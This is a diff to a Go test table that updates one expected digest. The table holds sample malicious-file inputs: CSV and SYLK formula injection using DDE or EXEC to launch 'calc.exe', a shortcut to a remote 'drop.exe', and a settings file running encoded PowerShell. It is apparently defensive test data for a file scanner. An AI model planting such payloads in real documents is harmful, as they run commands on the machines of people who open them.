@@ -59,7 +59,7 @@ func p16dCases() []p16dCase {
 	return []p16dCase{
 		{name: "script", input: encodedScript, wantDigest: "05d776378c43be99d1a6820cdf77443fedf9096ae2f95246ee6cd3ef34e605c4"},
 		{name: "csv", input: []byte("=cmd|'/c calc.exe'!A1,plain\n"), wantDigest: "2fded7fbd697ecb620e339f14637abf8d6301be0d69eb7a216586b30b9931e02"},
-		{name: "slk_folded", input: []byte("ID;PWXL;N;E\nC;Y1;X1;E=EXEC(CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99))\n"), wantDigest: "fc9d62ac8ef370040169352b8a7cacad2a6be80005487367a209f1710ae73f4e"},
+		{name: "slk_folded", input: []byte("ID;PWXL;N;E\nC;Y1;X1;E=EXEC(CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99))\n"), wantDigest: "96e00b93a8dcc2745efdeb6d213b5cc0ab84070d4701a02fc98c51cfae3175b1"},
 		{name: "slk_dde", input: []byte("ID;PWXL;N;E\nC;Y1;X1;E=cmd|'/c calc.exe'!A1\n"), wantDigest: "4ca9670e462c481f2f04766c0d196544f15f5a95b576c9200e6fe5b9967022eb"},
 		{name: "launcher", input: []byte("[InternetShortcut]\nURL=file://host/share/drop.exe\n"), wantDigest: "4991b6911f8ef22f0c4ff7268a85195b8f485d6318bee3d6dde4e31017901f74"},
 		{name: "setting_content", input: []byte(`<PCSettingsFile><DeepLink>powershell.exe -enc UDE2RA==</DeepLink></PCSettingsFile>`), wantDigest: "946a5cef0f219162b41381f5f74d63eacda8ff771eae83339ffacc794ef51779"},
